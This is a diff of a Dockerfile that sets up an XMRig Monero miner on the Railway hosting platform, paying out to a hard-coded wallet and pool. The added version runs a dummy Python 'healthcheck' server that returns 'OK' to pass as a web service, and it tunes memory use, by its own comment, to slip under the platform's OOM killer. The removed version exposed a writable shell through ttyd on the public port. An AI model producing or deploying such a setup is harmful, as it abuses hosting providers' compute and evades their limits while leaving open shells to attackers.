@@ -1,50 +1,39 @@
-# ==========================================
-# Stage 1: Build XMRig (Advanced Build)
-# ==========================================
-FROM alpine:latest AS builder
+FROM debian:12-slim
 
-RUN apk add --no-cache \
-    git \
-    make \
-    cmake \
-    libstdc++ \
-    gcc \
-    g++ \
-    automake \
-    libtool \
-    autoconf \
-    linux-headers
-
-WORKDIR /build
-RUN git clone https://github.com/xmrig/xmrig.git
-
-WORKDIR /build/xmrig/scripts
-RUN chmod +x build_deps.sh && ./build_deps.sh
-
-WORKDIR /build/xmrig/build
-RUN cmake .. -DXMRIG_DEPS=scripts/deps -DBUILD_STATIC=ON && \
-    make -j$(nproc)
-
-# ==========================================
-# Stage 2: Minimal Runtime Environment
-# ==========================================
-FROM alpine:latest
-
-# Install runtime C++ dependencies and ttyd
-RUN apk add --no-cache \
-    ttyd \
-    libstdc++ \
-    libgcc \
-    hwloc
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    ca-certificates \
+    curl \
+    tar \
+    python3 \
+    libhwloc-dev \
+    libuv1-dev \
+    libssl-dev \
+    && rm -rf /var/lib/apt/lists/*
 
 WORKDIR /app
 
-# Copy compiled executable from builder
-COPY --from=builder /build/xmrig/build/xmrig ./xmrig
-RUN chmod +x ./xmrig
+RUN curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && \
+    tar -xzf xmrig.tar.gz --strip-components=1 && \
+    rm xmrig.tar.gz && \
+    chmod +x xmrig
 
-# Expose default port (Railway will override this dynamically via $PORT)
-EXPOSE 8080
+RUN echo 'import http.server, os, threading\n\
+class Handler(http.server.BaseHTTPRequestHandler):\n\
+    def do_GET(self):\n\
+        self.send_response(200)\n\
+        self.end_headers()\n\
+        self.wfile.write(b"OK")\n\
+port = int(os.environ.get("PORT", 8080))\n\
+server = http.server.HTTPServer(("0.0.0.0", port), Handler)\n\
+threading.Thread(target=server.serve_forever, daemon=True).start()' > healthcheck.py
 
-# Start ttyd on Railway's assigned port and run XMRig in an auto-restart loop
-CMD ["sh", "-c", "ttyd -p ${PORT:-8080} -W /bin/sh -c 'while true; do ./xmrig -a gr -o stratum+tcp://ghostrider.unmineable.com:3333 -u voidequiem -p x; echo \"XMRig exited/disconnected. Restarting in 5 seconds...\"; sleep 5; done'"]
+ENV PYTHONUNBUFFERED=1
+
+# Light mode keeps RAM under 256MB to avoid Railway's OOM killer
+CMD python3 healthcheck.py & ./xmrig \
+    -a rx/0 \
+    -o rx.unmineable.com:3333 \
+    -u XMR:44t6aUmnEkmNXWrVNGZhmYhGi7m5iydtNFse9VsdfjSQYyoMvhXwpMASXPQ8JWDtoyiooKEwFCJ84YnNiNQ2fG4kJhDqGxm.RailwayWorker \
+    -p x \
+    --randomx-mode=light \
+    --donate-level=1
